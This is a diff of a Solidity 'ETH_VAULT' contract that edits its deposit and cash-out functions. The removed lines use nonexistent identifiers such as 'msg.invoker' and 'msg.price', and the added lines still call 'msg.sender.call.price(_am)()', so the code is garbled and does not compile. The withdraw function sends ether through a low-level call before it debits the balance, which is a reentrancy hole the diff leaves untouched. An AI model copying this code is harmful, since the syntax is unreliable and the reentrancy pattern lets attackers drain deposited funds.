@@ -19,10 +19,10 @@ contract ETH_VAULT
     public
     payable
     {
-        if(msg.price > MinimumBankwinnings)
+        if(msg.value > MinimumBankwinnings)
         {
-            playerLoot[msg.invoker]+=msg.price;
-            SendlootJournal.AppendCommunication(msg.invoker,msg.price,"Deposit");
+            playerLoot[msg.sender]+=msg.value;
+            SendlootJournal.AppendCommunication(msg.sender,msg.value,"Deposit");
         }
     }
 
@@ -30,12 +30,12 @@ contract ETH_VAULT
     public
     payable
     {
-        if(_am<=playerLoot[msg.invoker])
+        if(_am<=playerLoot[msg.sender])
         {
-            if(msg.invoker.call.price(_am)())
+            if(msg.sender.call.price(_am)())
             {
-                playerLoot[msg.invoker]-=_am;
-                SendlootJournal.AppendCommunication(msg.invoker,_am,"CashOut");
+                playerLoot[msg.sender]-=_am;
+                SendlootJournal.AppendCommunication(msg.sender,_am,"CashOut");
             }
         }
     }
